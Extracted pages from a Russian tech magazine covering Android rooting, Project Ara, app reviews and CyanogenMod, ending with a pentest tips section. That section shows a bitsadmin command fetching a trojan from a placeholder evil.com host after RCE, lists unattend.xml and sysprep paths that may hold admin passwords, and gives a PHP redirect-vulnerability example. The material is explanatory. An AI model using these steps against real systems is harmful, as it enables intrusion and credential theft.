прошивки. В рамках проекта Aroma Installer развивается вариант update-binary,
который позволяет создателям кастомных прошивок реализовать графиче-
ский инсталлятор с выбором тех или иных вариантов и опций установки.
   Автор Aroma Installer также создал Aroma
Filemanager — полноценный менеджер
файлов со встроенным эмулятором тер-
минала. Чтобы его запустить, необходимо
перезагрузиться в recovery и «прошить»
ZIP-файл. Естественно, никакая прошив-
ка выполнена не будет, ведь update-binary
внутри ZIP-файла — это только файловый
менеджер, он не выполняет никаких опе-
раций установки.
   «Фиктивный» update-binary часто ис-
пользуется для распространения разного
рода скриптов. Гораздо проще переиме-
новать скрипт в update-binary, запаковать
в ZIP-файл и попросить человека «про-
шить» его, чем объяснять, как запускать
скрипты с помощью ADB. Именно так по-
ступил osm0sis со своим скриптом раз-
блокировки загрузчика аппаратов линей-
ки Nexus. Если ты скачаешь его ZIP-файл
и взглянешь внутрь, то найдешь updater-
binary, внутри которого обычный sh-скрипт.

ROOT И INSECURE ADB
Ну и в конце пара слов о том, что такое root.  Эмулятор терминала, встроенный
                                              в Aroma Filemanager
Начнем со всем известных азов: в Linux
root — это имя пользователя с безгранич-
ными правами в системе (типа администратора в Windows). Root может вообще
все, вплоть до удаления всей системы с диска (именно это делает знаменитая
команда «rm -rf /*), поэтому обычно никто не сидит, так сказать, под рутом,
а использует непривилегированный аккаунт.
   Чтобы иметь возможность выполнять операции с правами root (например,
устанавливать софт или управлять сервисами), можно использовать разные
приложения (команды), одна из которых носит имя su. Она позволяет получить
права root или любого другого пользователя в системе, пароль которого тебе
известен. И все благодаря специальному SUID-биту, который позволяет su ра-
ботать с правами root, даже если оно было запущено обычным пользователем.
  В Android с правами root работает исключительно сама система (и то далеко
не вся), тогда как сервер ADB и приложения исполняются с правами неприви-
легированных пользователей (по одному пользователю Linux на каждое при-
ложение, серьезно), а команды su нет вообще. Поэтому единственный способ
получить права root в такой ситуации — воспользоваться уязвимостью в од-
ном из системных компонентов, работающих с правами root. Таким образом
можно не просто временно заполучить права root, но и использовать их, что-
бы разместить в системе бинарник su (скопировать в /system/xbin, например)
и поставить на него SETUID-бит. Именно так работают все наиболее популяр-
ные инструменты рутинга, от Super One Click до framaroot.
   Второй вариант — прошить бинарник su с помощью кастомной консоли
восстановления. Известный Android-разработчик Chainfire уже много лет за-
нимается разработкой и поддержкой инструмента для управления root-досту-
пом SuperSU, а также ZIP-архива, прошив который, ты получишь рутованный
смартфон (при установке он копирует в систему su и приложение SuperSU.apk).
Кстати, инструменты типа Framaroot вместе с бинарником su также устанав-
ливают SuperSU или его аналог SuperUser, чтобы пользователь мог управлять
тем, каким приложениям следует давать права root, а каким нет.
   Есть у Chainfire и другой интересный проект — CF-Auto-Root. Он тоже уста-
навливает в систему su и SuperSU, но делает это весьма оригинальным спосо-
бом: без задействования recovery. Инструмент CF-Auto-Root существует в двух
вариантах, для Odin и для fastboot, причем в последнем случае он представ-
ляет собой модифицированную версию recovery, которую не надо прошивать.
Ее следует запускать с помощью описанной в начале статьи команды fastboot
boot. Пример для Nexus 4:

$ fastboot boot CF-Auto-Root-mako-occam-nexus4.img

При загрузке «поддельный recovery» запускает не /sbin/recovery, а бинарник
/sbin/cfautoroot, который просто копирует в систему su и SuperSU и затем
перезагружает устройство. Зачем использовать такой извращенный способ,
когда можно установить кастомный recovery и прошить стандартный SuperSU.
zip? Ну например, это пригодится тем, кто не хочет по каким-то причинам уста-
навливать кастомный recovery.
   Последнее, о чем хотелось бы сказать, — разные виды root. В Android
root-доступ принято разделять на «пользовательский» и «root уровня ядра»
(kernel root). Это довольно глупые определения, но нам придется иметь с ними
дело. «Пользовательский root» — это то, что я описал выше: приложение запра-
шивает права root с помощью запуска /system/xbin/su, а SuperSU показывает
тебе окошко с запросом прав root. Все просто. Так называемый «root уровня
ядра» — это когда с правами root работает сервер ADB. Рутом уровня ядра он
называется по причине необходимости править boot.img, а точнее содержа-
щийся в нем init.rc (необходимо присвоить переменной property:service.
adb.root значение 1 и запустить adbd с флагом --root_seclabel=u:r:su:s0).
  Подавляющему большинству пользователей root уровня ядра никогда не по-
надобится. Однако его могут использовать некоторые скрипты и графические
инструменты, работающие со смартфоном по ADB (яркий пример: PatchROM
от MIUI). В CyanogenMod и многих других кастомных прошивках по умолчанию
доступны все виды root (их можно выбрать в «Настройках для разработчиков»).
Для получения root уровня ядра в других прошивках можно использовать при-
ложение adbd Insecure за авторством все того же Chainfire.

ВЫВОДЫ
Надеюсь, эта статья помогла тебе разобраться в том, как работают меха-
низмы разблокировки, прошивки и восстановления Android. В целом в этом
нет ничего сложного, и, поняв, как именно все это работает, ты избежишь
многих проблем, связанных с разблокировкой и перепрошивкой устрой-
ства. И даже если они возникнут — теперь ты сможешь их решить без по-
сторонней помощи.
X-Mobile


Колонка Евгения Зобнина
ЕСТЬ ЛИ

                                                                         Евгений Зобнин
                                                                                                             androidstreet.netБУДУЩЕЕ
У МОДУЛЬНЫХ
СМАРТФОНОВ?

Модульный смартфон от Google под кодовым име-
нем Project Ara уже успел наделать много шума и за-
светиться во всех хоть сколько-нибудь связанных
с мобильными технологиями изданиях. Действи-
тельно, девайс, который можно собрать по кусочкам
на манер всеми нами любимых IBM PC, — это очень
и очень заманчивая идея, чтобы не обратить на нее
внимание. Но давай спустимся на землю и выясним,
а нужна ли эта модульность на самом деле?
IBM PC был далеко не первым компьютером, допускающим расширение и ап-
грейд, но обычно именно он ассоциируется с понятием модульности. В IBM PC
можно заменить практически все, начиная от процессора и заканчивая чипом
BIOS. Если видеокарта перестала тянуть игры, достаточно купить новую, па-
мять всегда можно расширить, благо еще остались свободные слоты, жесткий
диск заменить на SSD. Да что там говорить, даже первые 3D-ускорители можно
было менять отдельно от самой видеокарты (я сам был обладателем voodoo2,
которая подключалась к выходу видяхи обычным VGA-шнуром). Удобно, эко-
номно, да и фантазию проявить можно.
   Так почему бы не использовать тот же подход в мобильной технике? В кон-
це концов, даже ноутбуки позволяют наращивать память, менять жесткие ди-
ски, оптические приводы, а иногда и видеоадаптер без необходимости пол-
ной разборки. Чем смартфоны хуже? Видимо, так в Google и решили, когда
начали проект Ara. В результате получился довольно забавный модульный
смартфон, состоящий из девяти модулей различного назначения и съемного
экрана. И его работающий прототип успешно продемонстрировали на Mobile
World Congress 2015.
  На первый взгляд смартфон выглядит очень и очень круто. Полный хотплаг
(во время выступления в работающий смартфон вставили модуль камеры, и он
тут же активировался), поддержка самых разных размеров модулей (от 1 x 1
до 2 x 2), простота установки и извлечения (все на магнитах), независимость
от места установки (контактные площадки и протокол обмена данными UniPro
у всех модулей одинаковы), открытый MDK (Module Development Kit), позволяю-
щий любым сторонним компаниям создавать собственные модули (Toshiba уже
отметилась 5-мегапиксельной камерой). Красота, да и только.
  Но давай немного отвлечемся от восторгов и попробуем задать Google во-
прос: какой выигрыш это нам дает? Если обратить внимание на презентацию
Project Ara, можно насчитать девять модулей, составляющих смартфон: про-
цессор (точнее, SoC), аккумулятор, два динамика, один совмещенный с каме-
рой фронтальный динамик, задняя камера, модуль Wi-Fi/Bluetooth, радиомо-
дуль (3G/LTE), порт microUSB и сменный экран.


          The world according to Project Ara: AP as module




          Audio                       Supervisory                        Display
         Module                          Controller                     Module
                                    UniPro                                                                            UniPro


        Application                               UniPro         UniPro            UniPro        Camera        Processor                                        Switch                      Module         Module
                                   UniPro                UniPro            UniPro


       LTE Modem                USB Port                         WiFi
         Module                      Module                      Module




                              Стандартные модули
Как видишь, возможностей расширения оперативной памяти, установки бо-
лее производительного видеоадаптера или хотя бы дополнительного модуля
постоянной памяти здесь не предусмотрено. Все это находится внутри мо-
дуля SoC. Такой подход можно оправдать: во-первых, инженеры явно стол-
кнулись с техническими ограничениями при подключении оперативной и по-
стоянной памяти с помощью UniPro, а во-вторых, современный мобильный
процессор — это именно система на кристалле. То есть, кроме самого CPU,
он включает в себя видеоускоритель, модуль позиционирования, специаль-
ные DSP-сопроцессоры, а иногда и LTE-модем (но не в случае с Project Ara).
Некоторые из этих компонентов, конечно, можно разнести или продублиро-
вать, но тот же ускоритель из кристалла не вытащишь, и в виде отдельных чи-
пов его не производят.
   Итого, мы имеем готовую вычислительную платформу, заключенную в один
модуль, плюс набор периферийных модулей. Какие из них может возникнуть
желание проапгрейдить?
• Камера? В современные смартфоны уже давно ставят сенсоры как мини-
  мум на 8 Мп. По качеству съемки они уделывают мыльницы, а до зеркалок им
   все равно не добраться.
• LTE-модем? Ну может быть, однако мне трудно представить, что кому-то
   в ближайшие годы будет мало скоростей LTE. Скорее сам Project Ara устареет.
• Экран? В смартфоны средней ценовой категории уже давно устанавливают
   качественные IPS-экраны с плотностью пикселей выше 300 DPI. А заменить
   разбитый экран в современном смартфоне так же просто, как установить
   дополнительный модуль оперативки в ноутбук.
• Порт microUSB? К моменту начала продаж Project Ara уже везде будут
  USB Type-C.
• Динамики? Ну это даже не смешно.

В целом есть всего два компонента, обновление/расширение которых имеет
хоть какой-то смысл: аккумулятор и сам процессор. Но и здесь не все так про-
сто — дело в том, что как полноценный смартфон Project Ara работает только
в полной сборке. Так что, если мы захотим установить дополнительные акку-
муляторы, нам придется отказаться от части функциональности, к примеру —
убрать динамики и камеру. В этом нет ничего плохого, но та же задача намного
эффективнее решается с помощью чехлов с дополнительной батареей.
                                                              Один
                                                                      из первых
                                                                       прототипов





   Что касается процессора (SoC’а), то тут ситуация двоякая. Действительно,
проще и дешевле купить новый «процессорный модуль» и вставить его в уже
имеющийся смартфон, чем покупать новый аппарат. Но это только на первый
взгляд. На самом деле плата, несущая SoC, оперативную и постоянную па-
мять, — это самый дорогой компонент смартфона, составляющий более поло-
вины его цены. А если так, то не проще ли купить новый смартфон? Цены на них
стремительно падают, и тот же OnePlus One с тремя гигами оперативки и че-
тырехъядерным Snapdragon 801 на 2,5 ГГц сегодня стоит всего 250 долларов
(новый). И он гораздо тоньше и эстетичнее, чем прототип Project Ara.


                                                                     OnePlus One
     Однако есть у Project Ara и другое интересное свойство: возможность уста-
  новки нестандартных модулей. Сторонние производители могут реализовать
  в виде модуля практически любой электронный инструмент, будь то 3D-сканер,
  инфракрасная камера, счетчик Гейгера, ФМ-трансмиттер или даже алкотестер.
  Все это можно подключить к смартфону и сейчас, но в Project Ara модули будут
   аккуратно встроены в сам аппарат вместо подключения к аудиоджеку или порту
   USB/Lightning. Да, это значительно удобнее, но опять же пользователей таких
  нестандартных модулей будет не так много.

           Ara spiral 3+ on-device network aechitecture (2015+)


Application Processor Module             Display Module                  Peripheral Module

                   PMIC/                        PMIC/ eMMC   RAM                                                      WiFi Transceiver               EPM                    EPM

                                                                                                                  h/s           PMIC/
                                                                                                                       12C  12S                                                                                                                                          SDIO   UART                       GPIO  EPM    eMMC                     LPDDR                                                                                                                                                       HSIC

         AP

          Android
                                        Display/Touch            General Purpose Bridge ASIC
      UniPro, Generis,
        Class Driver


                                                                                                                CSI-3                              UniPro           M-PHY                                                                                 M-PHY                                                                              UniPro           M-PHY



                                  N-port UniPro Switch ASIC

                                           CPORT

                                                                      SPI



                                        Supervisory
                                          Microcontroller




                     Связь модулей в Project Ara третьей реинкарнации
  Еще одно интересное применение Project Ara — это обмен модулей меж-
ду устройствами. В рамках проекта планируется выпустить три разных моде-
ли «каркаса» смартфона: среднего размера (примерно как Nexus 5), большого
(6-дюймовый фаблет) и малого (скорее всего, это 4–4,5-дюймовый смартфон).
Все они будут использовать одинаковый формат модулей, что откроет нам до-
вольно интересные схемы работы с устройствами. Например, ты приходишь
домой со своим смартфоном, достаешь из него процессор (а вместе с ним
и память), вставляешь в фаблет и продолжаешь работать как ни в чем не быва-
ло. Удобно, не правда ли? Но опять же все упирается в стремительно падаю-
щие цены на устройства.
   Ну и конечно, модулями можно будет обмениваться с друзьями и знакомы-
ми. Как насчет варианта взять на вечер модуль-проектор? Или поехать в зону
отчуждения, позаимствовав счетчик Гейгера? Звучит, конечно, несколько натя-
нуто, но идея вполне имеет право на жизнь, тем более что действительно инте-
ресные модули явно будут в дефиците.
  На этом, в общем-то, все. Ara — это концептуальный проект, который, как я
думаю, будет жить совсем не в том виде, в котором мы видим его сейчас.
Как платформа, которую можно апгрейдить, он, конечно, уже несостоятелен.
Пять лет назад этот аргумент сработал бы, но сейчас уже нет. А вот как система
для сборки собственных устройств с необычной функциональностью — почему
бы и нет? Это по меньшей мере интересно.
  В любом случае ждать релиза осталось совсем недолго: уже через полгода-год
мы сможем пощупать эту причудливую разработку собственными руками.
  X-Mobile

 ВЫПУСК #11. ЮЗАБИЛИТИ
КАРМАННЫЙ
СОФТ
 Сегодня в выпуске: учим Android понимать
 комбинацию <Ctrl + Z>, запускаем приложения
 с помощью кругового меню, переключаемся
 между запущенными приложениями четырьмя
 разными способами и добавляем знаменитый
  Control Center из iOS в Android.
                                   Omni Swipe

                                  Платформа
                                              Android

                                  Цена
                                          бесплатно





OMNI SWIPE
Довольно известное приложение, о котором нельзя не упомянуть, говоря
о юзабилити. Omni Swipe — это круговое меню, всплывающее в левом нижнем
углу после свайпа. Оно позволяет запускать приложения (их набор настраива-
ется), быстро вызывать абонентов и управлять настройками смартфона (Wi-Fi,
громкость, яркость и прочее). Все это находится в разных секторах виртуаль-
ного круга, который можно проматывать.
  В качестве дополнительных функций приложение позволяет быстро выпол-
нить поиск в интернете и даже показывает всплывающие уведомления. Натив-
но поддерживается почта, СМС и WhatsApp, но с Android 4.3 поддерживаются
и любые другие уведомления (достаточно активировать службу Omni Swipe
в настройках). Еще одна полезность — функция выгрузки фоновых приложе-
ний из памяти, доступна в «секторе» быстрых настроек.
                                            Inputting+:
                                           Universal undo redo

                                  Платформа
                                              Android

                                  Цена
                                          бесплатно





INPUTTING+
Android поддерживает буфер обмена, копирование и вставку, но почему-то
не поддерживает функции Undo (отмены) и Redo (отмена отмены) в полях вво-
да. А ведь порой такая возможность бывает очень необходима, особенно
когда случайно стираешь часть длиннющего сообщения WhatsApp. Inputting+
устраняет этот недостаток. создавая
   Приложение создает плавающую кнопку рядом с полями ввода. После на-
жатия на кнопку открывается окно с введенным текстом, где можно не только
удобно отредактировать текст, но и отменить внесенные в него изменения,
вновь их применить (Redo) или даже найти нужное слово или словосочетание.
Кроме того, Inputting+ поддерживает множество настроек, с помощью которых
можно изменить внешний вид и поведение кнопки или окна ввода.
                                       Quick Control Panel

                                  Платформа
                                              Android

                                  Цена
                                          бесплатно





QUICK CONTROL PANEL
В iOS есть замечательный элемент интерфейса под названием Control Center.
Это выезжающая снизу экрана панель, которая позволяет управлять быстры-
ми настройками (Wi-Fi, Bluetooth, режим полета), яркостью экрана, громкостью,
переключать треки во встроенном плеере, а также содержит иконки для запу-
ска фонарика, камеры и других приложений.
   Quick Control Panel — это попытка перенести ту же функциональность
в Android, следуя принципам Material Design. В целом это тот же Control Center,
но с возможностью тонкой настройки. Любой из элементов панели можно
убрать, кнопки быстрых настроек рассортировать (к слову говоря, они прома-
тываемые), иконки приложений выбрать те, что нужны именно тебе. Плюс воз-
можность настройки внешнего вида, включая фон, цвета и тени.
   Кстати, в Google Play можно найти и точную копию Control Center, достаточ-
но вбить два этих слова в поисковую строку.
                                          Switchr

                                  Платформа
                                              Android

                                  Цена
                                          бесплатно





SWITCHR
Switchr — один из самых удобных заменителей стандартного интерфейса
мультитаскинга. Проще говоря, это приложение, позволяющее переключать-
ся между запущенными в фоне приложениями, используя альтернативный ин-
терфейс. Причем вариантов такого интерфейса здесь четыре: проматываемая
влево и вправо лента с иконками приложений, переключатель в стиле Windows,
когда миниатюры приложений выезжают с левой стороны, круговое меню, по-
хожее на Omni Swipe, и простая сетка иконок.
  В качестве бонуса Switchr позволяет «закрепить» некоторые приложения,
так что их иконки будут отображаться даже в том случае, если сами приложе-
ния еще не запущены. Так что в целом это еще и неплохой «внешний лаунчер».
 X-Mobile
ДОЛОЙ СТОК!
10 ПРИЧИН УСТАНОВИТЬ CYANOGENMOD
                                         Евгений Зобнин
                                                         androidstreet.net



В глазах многих людей кастомные прошивки — это нечто
вроде пиратских сборок Windows с измененными обоями,
темами оформления и разным левым софтом в комплекте.
И если говорить о прошивках, созданных юными модели-
стами-конструкторами после школы, то так оно и есть. Од-
нако CyanogenMod не из их числа, это полноценный форк
Android, то есть независимая операционная система, раз-
работкой которой занимается команда компетентных про-
граммистов, и перед стоковым Android она имеет массу
преимуществ.

ВМЕСТО ВВЕДЕНИЯ
CyanogenMod — одна из первых кастомных прошивок Android. Ее история
началась еще во времена T-Mobile G1 и продолжается по сей день. Сегодня
CyanogenMod развивается компанией Cyanogen Inc. и официально доступна
для более чем 220 устройств и еще нескольких сотен неофициально. Сум-
марно прошивка установлена на 50 миллионов устройств по всему миру, а это
в несколько раз больше, чем количество устройств на базе Windows Phone
и BlackBerry вместе взятых.
  CyanogenMod в виде расширенной версии под названием Cyanogen OS
предустановлена всего на несколько смартфонов: OnePlus One, YU Yureka,
YU Yuphoria, Andromax Q и Oppo N1. Для всех остальных поддерживаемых
устройств система доступна в виде стандартной ZIP-прошивки для кастомной
консоли восстановления, вместе с которой обычно прошивают пакет Gapps,
содержащий приложения Google (маркет, поиск, Gmail и так далее).
  О том, как ставить прошивки, мы рассказывали много раз, поэтому сегодня
поговорим немного о другом. А именно о том, что может дать CyanogenMod
в сравнении со стоковой прошивкой, которая вроде бы отлично работает.
ПОДДЕРЖКА УСТАРЕВШИХ УСТРОЙСТВ
Одно из важнейших преимуществ CyanogenMod в сравнении со стоком —
это поддержка устаревших устройств. Зачастую после того, как производи-
тель забрасывает свое детище, появляются энтузиасты, готовые портировать
CyanogenMod на осиротевшее устройство. Широко распространенные девайсы
известных производителей обычно поддерживаются командой CyanogenMod
на протяжении трех-четырех лет, что намного дольше официальных сроков под-
держки. К примеру, для Galaxy S2 доступен CyanogenMod 12.1 на базе Android
5.1.1, что очень и очень неплохо для устройства 2011 года выпуска. 1





  CyanogenMod для официально поддерживаемых устройств
  всегда можно найти на download.cyanogenmod.org
ОТСУТСТВИЕ BLOATWARE
На второе место по значимости я бы по-
ставил чистоту CyanogenMod как опера-
ционной системы. В отличие от стоковых
прошивок здесь нет громоздкой оболочки,
привязки к левым аккаунтам, кучи беспо-
лезных приложений и странных функций,
которые компания-производитель считает
архиважными. CyanogenMod в этом смысле
больше напоминает чистый Android. Да, тут
есть масса настроек, но нет перегружен-
ности функциями и приложениями. Иконки
приложений только что установленной про-
шивки занимают чуть более половины одной 2
страницы в меню, и среди них только самое
важное: камера, галерея, браузер, файло-
вый менеджер и прочее.
   Благодаря легковесности CyanogenMod
обычно работает гораздо быстрее стока,
поэтому перешедшие на него редко воз-
вращаются обратно. Исключение составля-
ют разве что пользователи нексусов, привы-
кшие к голому Android.

Меню приложений сразу после установки Cyanogen-
      Mod и минимального пакета Google Apps
РЕГУЛЯРНЫЕ ОБНОВЛЕНИЯ
Разработка CyanogenMod ведется полно-
стью в открытом режиме. Каждый день раз-
работчики вносят изменения в открытый ре-
позиторий, и каждую ночь (у нас в это время
день) на основе этих изменений формиру-
ется новая сборка прошивки, которую мож-
но скачать и установить с помощью встро-
енных средств обновления ОС по воздуху.
Кроме ночных сборок, доступны также еже-
месячные стабильные M-релизы. Их сто-
ит ставить тем, кто боится поймать глюки
в ночных сборках.
   Такие частые обновления прошивки дают
пользователям CyanogenMod большое пре-
имущество в том, что касается багфиксов.
Прогремевший на весь мир баг в мультиме-
диа-библиотеке Stagefright был исправлен
в CyanogenMod уже 3 августа, за несколько
дней до конференций Black Hat и DEFCON.

             Стандартный интерфейс обновления
                             CyanogenMod
3
 КАСТОМИЗАЦИЯ
 В CyanogenMod очень много самых разных
 настроек. Изменить здесь можно практиче-
 ски все: расположение элементов в стро-
 ке состояния, набор и расположение кно-
 пок в панели быстрых настроек, поведение
 хардварных кнопок и кнопок на панели на-
 вигации внизу экрана, набор действий экра-
 на блокировки, стиль звонка, значение DPI
 экрана и многое другое. Сохраняя просто-
 ту голого Android, CyanogenMod позволяет4 очень тонко себя настроить.
   Опытный читатель, конечно, скажет, что
 почти все это можно сделать с помощью
 Xposed. Но, во-первых, устанавливать и на-
 страивать модули Xposed далеко не так
 удобно, как тапать по галочкам в хорошо ор-
 ганизованном меню настроек, а во-вторых,
 Xposed — это грязный хак, который нередко
 приводит к тормозам и глюкам.

        Настраиваем набор и расположение кнопок
                    в панели быстрых настроек
ТЕМЫ
Начиная с седьмой версии, CyanogenMod
поддерживает темы. Установить их мож-
но прямо из Google Play, а для актива-
ции достаточно одного тапа по нужной
кнопке. При этом тема может изменять
не только интерфейс Android, но и икон-
ки, звуки, рингтоны, обои, шрифты и даже
анимацию загрузки, без какого-либо за-
метного влияния на производительность.
Для CyanogenMod доступны сотни пер-
воклассных тем, многие из которых абсо-
лютно бесплатны.

                     Популярная тема LONE
5
 APP GUARD
 В CyanogenMod есть встроенный механизм защиты от вредоносного
 ПО и бэкдоров. Называется он App Guard (или «Защищенный режим» в рус-
 ской локализации) и позволяет сделать две вещи: запретить приложениям
 доступ к тем или иным данным или датчикам (отозвать полномочия) либо
 включить своего рода конфиденциальный режим, когда при запросе личных
 данных юзера (список контактов, местоположение, сведения о владель-
 це и так далее) приложение получает случайным образом сгенерирован-
 ную информацию. Например, рандомные координаты или список контактов
 с бессмыслицей вместо имен и телефонов.
    Стоит, однако, отметить, что механизм
 отзыва полномочий здесь совсем не такой,
 как в Android M, и соответствует его про-
 шлой реализации из Android 4.3 (там он был
 скрыт от посторонних глаз). Это значит, что
 после отключения тех или иных полномочий
 приложение может упасть или работать не-
 корректно.

             Список полномочий Google Chrome
6
LIVEDISPLAY
CyanogenMod   использует   интеллекту-
альный адаптивный механизм управле-
ния настройками экрана. Автоматически
регулируется не только яркость экрана,
но и цветовая температура. Это значит,
что вечером, когда солнце зайдет за гори-
зонт, система перейдет на использование
более теплых оттенков — так глаза мень-
ше устают. Более того, система умеет из-
менять насыщенность цветов при ярком
свете и использует специальные алгорит-
мы для лучшего отображения фотографий
и изображений.7   Справедливости ради стоит отметить,
что примерно те же функции есть в приложе-
нии CF.lumen (https://play.google.com/store/
apps/details?id=eu.chainfire.lumen), но рабо-
тает оно только на Android 4.4 и выше и тре-
бует права root.

                      Настройки LiveDisplay
ПРОФИЛИ
Еще одна полезная функция Android — это
профили. Нечто подобное зачастую есть
и в прошивках производителя, так что это
скорее приятное дополнение, чем уникаль-
ная функция. Профили позволяют сформи-
ровать своего рода предустановки для раз-
ных настроек смартфона, которые будут
активированы при выборе профиля. К при-
меру, можно создать профиль «В машине»,
при выборе которого будет автоматически
запускаться GPS и Bluetooth, а громкость
выворачиваться на максимум. Или профиль
«Совещание», включающий вибрацию и от-
ключающий синхронизацию с Google.
  В маркете есть много приложений, по-
зволяющих реализовать нечто подобное
(Tasker, Locale), да еще и с автоматическим
включением профилей, но они довольно
сложны в использовании и для управления
некоторыми настройками требуют плагины
и права root. А здесь все просто работает.

                Выбираем нужный профиль
8
УПРАВЛЕНИЕ СПЯЩИМ
СМАРТФОНОМ
Сегодня многие производители оснаща-
ют свои флагманские устройства функцией
пробуждения устройства с помощью двой-
ного тапа по экрану (Moto X, Nexus 6, LG G4,
OnePlus One/Two). Реализована она так: тачс-
крин продолжает работать даже после гаше-
ния экрана, а обработкой событий от него
занимается энергоэффективный DSP-про-
цессор, почти не потребляющий энергию.9  В  сборках  CyanogenMod  для  таких
устройств реализована не только функция
включения экрана, но и набор жестов, по-
зволяющий  активировать  определенные
функции без необходимости будить устрой-
ство. Среди таких жестов запуск камеры,
управление музыкальным плеером и вклю-
чение/отключение фонарика. Это действи-
тельно удобно.

                Включаем экранные жесты
ЧЕРНЫЙ СПИСОК
Любой, кто пытался найти в маркете блоки-
ратор неугодных номеров для Android, знает:
хороших блокираторов просто не существу-
ет. Большинство из них работают по прин-
ципу «снять трубку и тут же положить»,
в результате время от времени телефон вы-
ключает экран и долю секунды проигрывает
рингтон, а в списке звонков остается много
причудливых записей.
  В CyanogenMod блокиратор номеров
реализован на уровне системы, поэтому он
никогда не дает сбоев, не пропускает ринг-
тоны и в целом работает идеально. Кроме
явно заданных номеров, он позволяет бло-
кировать номера с помощью регулярных
выражений (как насчет заблокировать всех
новозеландцев?),  блокировать  скрытые
и неизвестные номера. В качестве бону-
са — возможность блокировки СМС (при-
чем отдельно от звонков).

  Дополнительные опции блокиратора номеров





ВЫВОДЫ
На самом деле в CyanogenMod гораздо больше интересных функций, я выде-
лил лишь наиболее полезные и заметные из них. Кроме всего перечисленного,
в CyanogenMod есть встроенный эквалайзер, рабочий стол с разными типами
меню приложений и множеством настроек, технология WhisperPush для обме-
на конфиденциальными СМС, виджет часов и погоды, профили производи-
тельности системы и многое другое. Устанавливай и делай выводы сам.10
ВЗЛОМ





Алексей «GreenDog» Тюрин, Digital Security
agrrrdog@gmail.com,,twitter.com/antyurin
EASY





       WARNINGHACK
            Вся информация предоставлена исключительно в ознакомительных
              целях. Лица, использующие данную информацию в
             противозаконных целях, могут быть привлечены к ответственности.
ЗАДАЧА: ЗАКАЧАТЬ ФАЙЛ В WINDOWS
С ПОМОЩЬЮ BITS

Представим себе типичную ситуацию: через какую-то уязвимость мы по-
лучили возможность удаленно выполнять команды на сервере с Windows.
Высоких привилегий в ОС у нас нет, и порты зафильтрованы на внешнем
файрволе. Подошел бы вариант с бэк-коннект шеллом, но ведь надо зака-
чать наш шелл в ОС. И если под *nix-системы существует куча разных воз-
можностей, то с виндой труднее. Можно, конечно, использовать FTP-кли-
ент или скрипт WSH, но эти варианты требуют многострочных действий,
что часто бывает проблемой из-за ограничений уязвимости, которая дает
RCE.
   Оказывается, Windows еще со времен XP хранит в себе интересную
тулзу — bitsadmin. Это часть специальной подсистемы BITS, Background
Intelligent Transfer Service. Эта подсистема используется для скачивания
больших файлов со сторонних ресурсов по HTTP. Автоматическое об-
новление Windows и обновление антивиря Defender происходит как раз
через нее. К тому же ее использует ряд сторонних программ. Она доста-
точно «умна», так как поддерживает функцию докачки файлов при обрыве
подключения (или выходе пользователя из системы), закачку нескольких
файлов и их приоритезацию, а также подстройку скорости скачивания
файла в зависимости от загрузки канала связи.
  Для нас самая главная возможность — это запуск bitsadmin от непри-
вилегированного пользователя и с минимум спецсимволов. Кстати, ка-
ждая закачка «оформляется» в виде задачи (job).

bitsadmin /transfer myjob /download http://evil.com/trojan.exe
    c:\Windows\Temp\kb123456.exe

Ключ /transfer myjob указывает на то, что мы хотим создать новую за-
дачу с именем myjob и с типом download. Далее указывается полный путь
до файла и место для сохранения. Помни, что у тебя должны быть права
на запись в ту директорию, куда будет сохранен файл (к примеру, у юзера
обычно есть доступ к Temp).
   Вот и все! Файл будет скачан, возможно — потребуется подождать,
если канал загружен.
  И еще пара моментов. Во-первых, тулза поддерживает прокси.
По умолчанию используются настройки IE, но можно выставить через па-
раметры к bitsadmin и свои значения. Во-вторых, можно не только скачи-
вать файлы, но и заставить ОС выгрузить файл из файловой системы на внеш-
ний хост (команда upload), правда, нужно поднимать специальный BITS-сервер.
И последнее: начиная с Windows 7, эта утилита помечена как deprecated, так
что в будущем она пропадет из ОС. Но в Windows 8 она еще присутствует.

Полный перечень команд bitsadmin.

                                                                     Пример
                                                                                загрузки файла
                                                                                    с помощью
                                                                                     bitsadmin в ОС





ЗАДАЧА: ПОЛУЧИТЬ ПАРОЛЬ АДМИНА WINDOWS

Еще один трюк, посвященный Windows, который может позволить нам поднять
привилегии в системе за счет получения пароля локального администратора
в плейнтексте.
   У каждой крупной компании есть типовая задача: покупаются новые компью-
теры, и на них надо установить Windows и дополнительное ПО, настроить. Есть
несколько официальных подходов к автоматизации этого процесса, но их под-
робности для нас не особенно важны. Интересно лишь то, что при установке
ОС необходимо указывать различные параметры и они задаются с помощью
специального файла. Причем если задается пароль для пользователя (локаль-
ного админа), то содержится он в этом файле в плейнтексте (максимум —
в Base64). Иногда этот файл может быть оставлен в файловой системе Windows.
   Таким образом, обладая лишь пользовательским доступом в ОС, мы можем
поискать этот специальный файл и узнать, нет ли в нем пароля. Воистину easy hack!
  Я намеренно назвал этот файл «специальным», так как в зависимости от ме-
тода автоматического развертывания системы имя файла, его формат и рас-
положение могут варьироваться.
   Вот перечень файлов и типовых путей до них:

C:\Windows\Panther\unattend.xml или Autounattend.xml
C:\Windows\Panther\Unattend\unattend.xml или Autounattend.xml
C:\sysprep.inf
C:\sysprep\sysprep.xml

Все эти папки по умолчанию доступны на чтение для обычных пользователей.
Еще стоит отметить, что в Metasploit есть специальный модуль для постэксплу-
атации: post/windows/gather/enum_unattend.





Пример файла unattend.xml из интернета. Пароль админа в Base64


ЗАДАЧА: НАЙТИ УЯЗВИМОСТЬ ТИПА EAR

EAR — интересная уязвимость, которой подвержены некоторые веб-фрейм-
ворки. Название расшифровывается как Execution After Redirection, исполнение
после редиректа. Ее можно отнести к «ошибкам логики» приложения.
  Вспомним для начала, как взаимодействуют между собой веб-браузер
и веб-сервер. Браузер отправляет запрос, на сервере запрос передается об-
работчику (например, скрипту на PHP). Результат обработки передается обрат-
но веб-серверу, который возвращает его в браузер. После чего браузер ото-
бражает ответ. Все просто и знакомо.
  В HTTP есть такая вещь, как редирект — перенаправление на другой ре-
сурс. Его можно сделать на клиентской стороне (с помощью JS или HTML)
либо инициировать специальным ответом от сервера. Вариаций второго ва-
рианта достаточно много — все ответы со статусом 3xx (301 и 302, думаю,
всем знакомы). В специальном заголовке Location передается URL для пере-
хода. Браузер при получении ответа сразу переходит по URL, не отображая
содержимое ответа.
  В общем, из веб-приложения мы можем инициировать редирект. Вот при-
мер на PHP:

header(‘Location: index.php’);

Это все, что требуется. Понятно, что этой возможностью пользуются достаточ-
но часто.
   Что же происходит с остальным кодом, который идет после функции для ре-
директа? Разберем пример.

if ($password!= ‘qwerty’){
    header(‘Location: login.php’);
}
echo ‘Welcome!’;

